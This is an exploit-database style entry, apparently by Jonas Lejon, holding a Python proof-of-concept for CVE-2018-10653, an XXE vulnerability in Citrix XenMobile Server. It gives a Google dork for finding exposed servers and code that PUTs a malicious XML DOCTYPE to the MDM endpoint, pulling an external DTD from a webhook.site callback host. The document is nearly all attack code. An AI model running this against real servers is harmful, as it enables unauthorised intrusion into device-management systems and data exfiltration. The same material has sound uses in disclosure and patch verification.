# Google Dork: inurl:zdm logon
# Exploit Author: Jonas Lejon
# Vendor Homepage: https://www.citrix.com
# Software Link:
# Version: XenMobile Server 10.8 before RP2 and 10.7 before RP3
# Tested on: XenMobile
# CVE : CVE-2018-10653

#!/usr/bin/python3
##
## PoC exploit test for the security vulnerability CVE-2018-10653 in
XenMobile Server 10.8 before RP2 and 10.7 before RP3
##
## This PoC was written by Jonas Lejon 2019-11-28
<jonas.xenmobile@triop.se> https://triop.se
## Reported to Citrix 2017-10, patch released 2018-05
##

import requests
import sys
from pprint import pprint
import uuid

# Surf to https://webhook.site and copy/paste the URL below. Used for
XXE callback
WEBHOOK = "https://webhook.site/310d8cd9-ebd3-xxx-xxxx-xxxxxx/"

id = str(uuid.uuid1())

xml = &#039;&#039;&#039;<?xml version="1.0" encoding="UTF-8"
standalone=&#039;no&#039;?><!DOCTYPE plist [<!ENTITY % j00t9 SYSTEM "&#039;&#039;&#039; +
WEBHOOK + id + &#039;&#039;&#039;/test.dtd">%j00t9; ]>&#039;&#039;&#039;

print(id)

response = requests.put(sys.argv[1] + &#039;/zdm/ios/mdm&#039;, verify=False,
 headers=
{&#039;User-Agent&#039;: &#039;MDM/1.0&#039;,
&#039;Connection&#039;: &#039;close&#039;,
&#039;Content-Type&#039;: &#039;application/x-apple-aspen-mdm&#039;},
data=xml,stream=True
)
print(response.content)
print(response.text)
pprint(response)

